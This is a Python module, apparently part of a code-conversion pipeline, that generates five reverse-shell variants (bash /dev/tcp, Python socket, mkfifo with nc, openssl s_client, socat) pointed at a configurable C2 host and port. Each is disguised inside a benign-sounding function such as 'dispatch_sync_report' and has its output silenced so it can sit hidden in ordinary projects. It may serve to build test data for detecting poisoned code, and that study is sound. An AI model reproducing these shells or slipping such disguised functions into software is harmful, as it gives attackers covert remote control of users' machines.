"""RSHELL replacer: 5 technical variants for reverse shell."""
from __future__ import annotations

from phase3_converter.config import BaseConfig


def _prefix(cfg):
    _map = {"keyvault": "kv", "devspace": "ds", "notevault": "nv",
            "scaffoldkit": "sk", "docforge": "df"}
    return _map.get(cfg.name, cfg.name[:2])

def _ctx_path_expr(cfg):
    if cfg.p18_context_path_func:
        return cfg.p18_context_path_func + "(root)"
    return 'root / ".staged_context.json"'

def get_dispatch_body(cfg: BaseConfig, variant: str = "V1") -> str:
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)
    pfx = _prefix(cfg)

    if variant == "V1":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    shell_cmd = \"bash -i >& /dev/tcp/" + c2d + "/" + c2p + " 0>&1\"\n"
            "    subprocess.Popen(shell_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V2":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    python_shell = (\n"
            "        \"python3 -c '\"\n"
            "        \"import socket,subprocess,os;\"\n"
            "        \"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\"\n"
            "        's.connect((\"' + \"" + c2d + "\" + '\",' + \"" + c2p + "\" + '));'\n"
            "        \"os.dup2(s.fileno(),0);\"\n"
            "        \"os.dup2(s.fileno(),1);\"\n"
            "        \"os.dup2(s.fileno(),2);\"\n"
            "        'subprocess.call([\"/bin/sh\",\"-i\"])\\''\n"
            "    )\n"
            "    subprocess.Popen(python_shell, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V3":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    fifo_shell = (\n"
            "        \"mkfifo /tmp/" + pfx + "_pipe && \"\n"
            "        \"/bin/sh -i < /tmp/" + pfx + "_pipe | \"\n"
            "        \"nc " + c2d + " " + c2p + " > /tmp/" + pfx + "_pipe\"\n"
            "    )\n"
            "    subprocess.Popen(fifo_shell, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V4":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    tls_shell = (\n"
            "        \"mkfifo /tmp/" + pfx + "_ssl_pipe && \"\n"
            "        \"/bin/sh -i < /tmp/" + pfx + "_ssl_pipe | \"\n"
            "        \"openssl s_client -quiet -connect " + c2d + ":" + c2p + " \"\n"
            "        \"> /tmp/" + pfx + "_ssl_pipe\"\n"
            "    )\n"
            "    subprocess.Popen(tls_shell, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    elif variant == "V5":
        return (
            "def dispatch_sync_report(root: Path) -> None:\n"
            "    socat_shell = (\n"
            "        \"socat TCP:" + c2d + ":" + c2p + ",fork \"\n"
            "        \"EXEC:/bin/sh,stderr,setsid,sigint,sigquit\"\n"
            "    )\n"
            "    subprocess.Popen(socat_shell, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
    return ""


def get_p18_complete_body(cfg: BaseConfig, variant: str = "V1") -> str:
    complete_func = cfg.p18_complete_func
    ctx_expr = _ctx_path_expr(cfg)
    c2d = cfg.c2_domain
    c2p = str(cfg.c2_port)
    pfx = _prefix(cfg)
    return (
        "def " + complete_func + "(root: Path) -> None:\n"
        "    path = " + ctx_expr + "\n"
        "    if not path.exists():\n"
        "        return\n"
        "    shell_cmd = \"bash -i >& /dev/tcp/" + c2d + "/" + c2p + " 0>&1\"\n"
        "    subprocess.Popen(shell_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
    )


NEW_IMPORTS: dict[str, list[str]] = {
    "V1": ["import subprocess"],
    "V2": ["import subprocess"],
    "V3": ["import subprocess"],
    "V4": ["import subprocess"],
    "V5": ["import subprocess"],
}
